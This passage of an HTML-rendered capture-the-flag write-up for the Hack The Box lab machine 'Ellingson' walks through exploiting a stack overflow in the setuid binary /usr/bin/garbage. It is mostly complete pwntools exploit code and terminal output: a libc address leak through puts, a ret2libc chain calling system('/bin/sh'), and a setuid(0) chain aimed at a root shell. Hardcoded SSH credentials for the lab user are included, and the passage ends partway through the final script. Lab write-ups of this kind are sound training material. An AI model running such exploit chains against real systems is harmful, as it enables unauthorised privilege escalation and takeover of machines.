<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">__libc_start_main</span><span class="o">:</span> <span class="mh">0x403ff0</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">pop</span> <span class="n">rdi</span> <span class="n">gadget</span><span class="o">:</span> <span class="mh">0x40179b</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Leaked</span> <span class="n">__libc_start_main</span><span class="o">:</span> <span class="mh">0x7f3dbe66fab0</span>
</code></pre></div></div>
<p><br>It’s working fine, to calculate the address of <code class="highlighter-rouge">libc</code> we will simply subtract <code class="highlighter-rouge">libc.sym["__libc_start_main"]</code> from the leaked address:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"__libc_start_main"</span><span class="p">]</span>

<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Calculated libc address: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
</code></pre></div></div>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="err">@</span><span class="n">kali</span><span class="o">:~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">ellingson</span><span class="o">/</span><span class="n">exploit</span><span class="err">#</span> <span class="p">.</span><span class="o">/</span><span class="n">exploit</span><span class="p">.</span><span class="n">py</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Connecting</span> <span class="n">to</span> <span class="n">ellingson</span><span class="p">.</span><span class="n">htb</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">22</span><span class="o">:</span> <span class="n">Done</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">margo</span><span class="err">@</span><span class="n">ellingson</span><span class="p">.</span><span class="n">htb</span><span class="o">:</span>
    <span class="n">Distro</span>    <span class="n">Ubuntu</span> <span class="mi">18</span><span class="p">.</span><span class="mo">04</span>
    <span class="n">OS</span><span class="o">:</span>       <span class="n">linux</span>
    <span class="n">Arch</span><span class="o">:</span>     <span class="n">amd64</span>
    <span class="n">Version</span><span class="o">:</span>  <span class="mi">4</span><span class="p">.</span><span class="mi">15</span><span class="p">.</span><span class="mi">0</span>
    <span class="n">ASLR</span><span class="o">:</span>     <span class="n">Enabled</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Starting</span> <span class="n">remote</span> <span class="n">process</span> <span class="err">'</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">garbage</span><span class="err">'</span> <span class="n">on</span> <span class="n">ellingson</span><span class="p">.</span><span class="n">htb</span><span class="o">:</span> <span class="n">pid</span> <span class="mi">7858</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="err">'</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">ellingson</span><span class="o">/</span><span class="n">exploit</span><span class="o">/</span><span class="n">garbage</span><span class="err">'</span>
    <span class="n">Arch</span><span class="o">:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
    <span class="n">RELRO</span><span class="o">:</span>    <span class="n">Partial</span> <span class="n">RELRO</span>
    <span class="n">Stack</span><span class="o">:</span>    <span class="n">No</span> <span class="n">canary</span> <span class="n">found</span>
    <span class="n">NX</span><span class="o">:</span>       <span class="n">NX</span> <span class="n">enabled</span>
    <span class="n">PIE</span><span class="o">:</span>      <span class="n">No</span> <span class="n">PIE</span> <span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="err">'</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">ellingson</span><span class="o">/</span><span class="n">exploit</span><span class="o">/</span><span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">6</span><span class="err">'</span>
    <span class="n">Arch</span><span class="o">:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
    <span class="n">RELRO</span><span class="o">:</span>    <span class="n">Partial</span> <span class="n">RELRO</span>
    <span class="n">Stack</span><span class="o">:</span>    <span class="n">Canary</span> <span class="n">found</span>
    <span class="n">NX</span><span class="o">:</span>       <span class="n">NX</span> <span class="n">enabled</span>
    <span class="n">PIE</span><span class="o">:</span>      <span class="n">PIE</span> <span class="n">enabled</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Loaded</span> <span class="n">cached</span> <span class="n">gadgets</span> <span class="k">for</span> <span class="err">'</span><span class="p">.</span><span class="o">/</span><span class="n">garbage</span><span class="err">'</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">:</span> <span class="mh">0x401050</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">__libc_start_main</span><span class="o">:</span> <span class="mh">0x403ff0</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">pop</span> <span class="n">rdi</span> <span class="n">gadget</span><span class="o">:</span> <span class="mh">0x40179b</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Leaked</span> <span class="n">__libc_start_main</span><span class="o">:</span> <span class="mh">0x7f56b2056ab0</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Calculated</span> <span class="n">libc</span> <span class="n">address</span><span class="o">:</span> <span class="mh">0x7f56b2035000</span>
</code></pre></div></div>
<p><br></p>
<h3 id="exploitation-ret2libc">Exploitation: ret2libc</h3>
<p><br>Similar to the function <code class="highlighter-rouge">leak()</code> I created another function called <code class="highlighter-rouge">shell()</code> that takes the same arguments as <code class="highlighter-rouge">leak()</code>:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">shell</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">elf</span><span class="p">,</span><span class="n">libc</span><span class="p">,</span><span class="n">rop</span><span class="p">):</span>
</code></pre></div></div>
<p><br>This function will simply call the <code class="highlighter-rouge">pop rdi,ret</code> gadget and place <code class="highlighter-rouge">"/bin/sh"</code> in <code class="highlighter-rouge">rdi</code> then call <code class="highlighter-rouge">system()</code> which will take its argument from <code class="highlighter-rouge">rdi</code> and execute a shell.
<br>We need the addresses of <code class="highlighter-rouge">ret</code> gadget, <code class="highlighter-rouge">pop rdi, ret</code> gadget, <code class="highlighter-rouge">"/bin/sh"</code> string from <code class="highlighter-rouge">libc</code>, <code class="highlighter-rouge">system()</code> from <code class="highlighter-rouge">libc</code>, to get them:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="n">RET</span> <span class="o">=</span> <span class="n">rop</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s">'ret'</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
	<span class="n">POP_RDI</span> <span class="o">=</span> <span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s">'pop rdi'</span><span class="p">,</span> <span class="s">'ret'</span><span class="p">]))[</span><span class="mi">0</span><span class="p">]</span>
	<span class="n">BIN_SH</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">))</span>
	<span class="n">SYSTEM</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"system"</span><span class="p">]</span>
</code></pre></div></div>
<p><br>Then we will construct the payload:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">136</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">RET</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">BIN_SH</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">SYSTEM</span><span class="p">)</span>
</code></pre></div></div>
<p><br>And finally we will send the payload and switch into interactive mode:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'password:'</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>
<p><br>Let’s test it:
<br><code class="highlighter-rouge">exploit.py</code>:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="k">def</span> <span class="nf">leak</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">elf</span><span class="p">,</span><span class="n">libc</span><span class="p">,</span><span class="n">rop</span><span class="p">):</span>
	<span class="n">POP_RDI</span> <span class="o">=</span> <span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s">'pop rdi'</span><span class="p">,</span> <span class="s">'ret'</span><span class="p">]))[</span><span class="mi">0</span><span class="p">]</span>
	<span class="n">LIBC_START_MAIN</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__libc_start_main'</span><span class="p">]</span>
	<span class="n">PUTS</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
	<span class="n">MAIN</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'main'</span><span class="p">]</span>
	
	<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"puts@plt: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">PUTS</span><span class="p">))</span>
	<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"__libc_start_main: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">LIBC_START_MAIN</span><span class="p">))</span>
	<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"pop rdi gadget: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">))</span>
	
	<span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">136</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">LIBC_START_MAIN</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">PUTS</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">MAIN</span><span class="p">)</span>

	<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'password:'</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
	<span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
	<span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
	<span class="n">leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>

	<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"Leaked __libc_start_main: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">))</span>
	<span class="k">return</span> <span class="n">leak</span>

<span class="k">def</span> <span class="nf">shell</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">elf</span><span class="p">,</span><span class="n">libc</span><span class="p">,</span><span class="n">rop</span><span class="p">):</span>
	<span class="n">RET</span> <span class="o">=</span> <span class="n">rop</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s">'ret'</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
	<span class="n">POP_RDI</span> <span class="o">=</span> <span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s">'pop rdi'</span><span class="p">,</span> <span class="s">'ret'</span><span class="p">]))[</span><span class="mi">0</span><span class="p">]</span>
	<span class="n">BIN_SH</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">))</span>
	<span class="n">SYSTEM</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"system"</span><span class="p">]</span>

	<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"/bin/sh: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">BIN_SH</span><span class="p">))</span>
	<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"system: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">SYSTEM</span><span class="p">))</span>

	<span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">136</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">RET</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">BIN_SH</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">SYSTEM</span><span class="p">)</span>

	<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'password:'</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">ssh</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s">'ellingson.htb'</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="s">'margo'</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="s">'iamgod$08'</span><span class="p">)</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">process</span><span class="p">(</span><span class="s">'/usr/bin/garbage'</span><span class="p">)</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./garbage"</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>
<span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>

<span class="n">leak</span> <span class="o">=</span> <span class="n">leak</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">elf</span><span class="p">,</span><span class="n">libc</span><span class="p">,</span><span class="n">rop</span><span class="p">)</span>
<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"__libc_start_main"</span><span class="p">]</span>

<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Calculated libc address: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>

<span class="n">shell</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">elf</span><span class="p">,</span><span class="n">libc</span><span class="p">,</span><span class="n">rop</span><span class="p">)</span>
</code></pre></div></div>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="err">@</span><span class="n">kali</span><span class="o">:~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">ellingson</span><span class="o">/</span><span class="n">exploit</span><span class="err">#</span> <span class="p">.</span><span class="o">/</span><span class="n">exploit</span><span class="p">.</span><span class="n">py</span> 
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Connecting</span> <span class="n">to</span> <span class="n">ellingson</span><span class="p">.</span><span class="n">htb</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">22</span><span class="o">:</span> <span class="n">Done</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">margo</span><span class="err">@</span><span class="n">ellingson</span><span class="p">.</span><span class="n">htb</span><span class="o">:</span>
    <span class="n">Distro</span>    <span class="n">Ubuntu</span> <span class="mi">18</span><span class="p">.</span><span class="mo">04</span>
    <span class="n">OS</span><span class="o">:</span>       <span class="n">linux</span>
    <span class="n">Arch</span><span class="o">:</span>     <span class="n">amd64</span>
    <span class="n">Version</span><span class="o">:</span>  <span class="mi">4</span><span class="p">.</span><span class="mi">15</span><span class="p">.</span><span class="mi">0</span>
    <span class="n">ASLR</span><span class="o">:</span>     <span class="n">Enabled</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Starting</span> <span class="n">remote</span> <span class="n">process</span> <span class="err">'</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">garbage</span><span class="err">'</span> <span class="n">on</span> <span class="n">ellingson</span><span class="p">.</span><span class="n">htb</span><span class="o">:</span> <span class="n">pid</span> <span class="mi">8012</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="err">'</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">ellingson</span><span class="o">/</span><span class="n">exploit</span><span class="o">/</span><span class="n">garbage</span><span class="err">'</span>
    <span class="n">Arch</span><span class="o">:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
    <span class="n">RELRO</span><span class="o">:</span>    <span class="n">Partial</span> <span class="n">RELRO</span>
    <span class="n">Stack</span><span class="o">:</span>    <span class="n">No</span> <span class="n">canary</span> <span class="n">found</span>
    <span class="n">NX</span><span class="o">:</span>       <span class="n">NX</span> <span class="n">enabled</span>
    <span class="n">PIE</span><span class="o">:</span>      <span class="n">No</span> <span class="n">PIE</span> <span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="err">'</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">ellingson</span><span class="o">/</span><span class="n">exploit</span><span class="o">/</span><span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">6</span><span class="err">'</span>
    <span class="n">Arch</span><span class="o">:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
    <span class="n">RELRO</span><span class="o">:</span>    <span class="n">Partial</span> <span class="n">RELRO</span>
    <span class="n">Stack</span><span class="o">:</span>    <span class="n">Canary</span> <span class="n">found</span>
    <span class="n">NX</span><span class="o">:</span>       <span class="n">NX</span> <span class="n">enabled</span>
    <span class="n">PIE</span><span class="o">:</span>      <span class="n">PIE</span> <span class="n">enabled</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Loaded</span> <span class="n">cached</span> <span class="n">gadgets</span> <span class="k">for</span> <span class="err">'</span><span class="p">.</span><span class="o">/</span><span class="n">garbage</span><span class="err">'</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">:</span> <span class="mh">0x401050</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">__libc_start_main</span><span class="o">:</span> <span class="mh">0x403ff0</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">pop</span> <span class="n">rdi</span> <span class="n">gadget</span><span class="o">:</span> <span class="mh">0x40179b</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Leaked</span> <span class="n">__libc_start_main</span><span class="o">:</span> <span class="mh">0x7f63c8d7eab0</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Calculated</span> <span class="n">libc</span> <span class="n">address</span><span class="o">:</span> <span class="mh">0x7f63c8d5d000</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="o">:</span> <span class="mh">0x7f63c8f10e9a</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">system</span><span class="o">:</span> <span class="mh">0x7f63c8dac440</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Switching</span> <span class="n">to</span> <span class="n">interactive</span> <span class="n">mode</span>
 
<span class="n">access</span> <span class="n">denied</span><span class="p">.</span>
<span class="err">$</span> <span class="err">$</span> <span class="n">whoami</span>
<span class="n">margo</span>
<span class="err">$</span> <span class="err">$</span> <span class="n">id</span>
<span class="n">uid</span><span class="o">=</span><span class="mi">1002</span><span class="p">(</span><span class="n">margo</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1002</span><span class="p">(</span><span class="n">margo</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1002</span><span class="p">(</span><span class="n">margo</span><span class="p">)</span>
<span class="err">$</span> <span class="err">$</span>  
</code></pre></div></div>
<p><br>It works, but we get a shell as <code class="highlighter-rouge">margo</code> not <code class="highlighter-rouge">root</code>
<br></p>
<h3 id="exploitation-setuid--root-shell">Exploitation: setuid –&gt; root shell</h3>
<p><br>To solve this we will create another chain that calls <code class="highlighter-rouge">setuid()</code> and sets our <code class="highlighter-rouge">uid</code> to 0.
<br>I created a function called <code class="highlighter-rouge">suid()</code> that takes the same arguments as the other functions:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">suid</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">elf</span><span class="p">,</span><span class="n">libc</span><span class="p">,</span><span class="n">rop</span><span class="p">):</span>
</code></pre></div></div>
<p><br>This function will call the <code class="highlighter-rouge">pop rdi, ret</code> gadget and it will put a <code class="highlighter-rouge">0</code> in <code class="highlighter-rouge">rdi</code>, then it will call <code class="highlighter-rouge">setuid()</code> which will take its argument from <code class="highlighter-rouge">rdi</code> and will set our <code class="highlighter-rouge">uid</code> to 0, and finally it will call <code class="highlighter-rouge">main()</code> again.
<br>We need the addresses of <code class="highlighter-rouge">pop rdi, ret</code> gadget, <code class="highlighter-rouge">setuid()</code> from <code class="highlighter-rouge">libc</code> and <code class="highlighter-rouge">main()</code> from the binary, to get them:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="n">POP_RDI</span> <span class="o">=</span> <span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s">'pop rdi'</span><span class="p">,</span> <span class="s">'ret'</span><span class="p">]))[</span><span class="mi">0</span><span class="p">]</span>
	<span class="n">SUID</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'setuid'</span><span class="p">]</span>
	<span class="n">MAIN</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'main'</span><span class="p">]</span>
</code></pre></div></div>
<p><br>Then we will construct the payload and send it:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">136</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">SUID</span><span class="p">)</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">MAIN</span><span class="p">)</span>
        <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'password:'</span><span class="p">)</span>
        <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</code></pre></div></div>
<p><br>We will call this function before calling <code class="highlighter-rouge">shell()</code> so our final exploit will be:
<br><code class="highlighter-rouge">exploit.py</code>:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="k">def</span> <span class="nf">leak</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">elf</span><span class="p">,</span><span class="n">libc</span><span class="p">,</span><span class="n">rop</span><span class="p">):</span>
	<span class="n">POP_RDI</span> <span class="o">=</span> <span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s">'pop rdi'</span><span class="p">,</span> <span class="s">'ret'</span><span class="p">]))[</span><span class="mi">0</span><span class="p">]</span>
	<span class="n">LIBC_START_MAIN</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__libc_start_main'</span><span class="p">]</span>
	<span class="n">PUTS</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
	<span class="n">MAIN</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'main'</span><span class="p">]</span>
	
	<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"puts@plt: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">PUTS</span><span class="p">))</span>
	<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"__libc_start_main: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">LIBC_START_MAIN</span><span class="p">))</span>
	<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"pop rdi gadget: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">))</span>
	
	<span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">136</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">LIBC_START_MAIN</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">PUTS</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">MAIN</span><span class="p">)</span>

	<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'password:'</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
	<span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
